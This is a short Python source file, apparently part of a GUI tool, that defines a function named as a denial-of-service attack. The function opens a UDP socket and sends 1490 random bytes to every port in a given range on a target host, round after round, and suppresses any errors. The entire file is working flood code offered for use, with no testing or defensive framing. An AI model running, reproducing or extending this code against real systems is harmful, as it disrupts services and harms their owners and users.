#import libraries
import socket
import random

#dos attack
def dos_attack(rounds, port_start, port_end, host, window):

    #close window
    window.destroy()

    #start
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    for i in range(rounds):
        for port in range(port_start, port_end + 1):
            try:
                sock.sendto(bytes, (host, port))
            except:
                continue
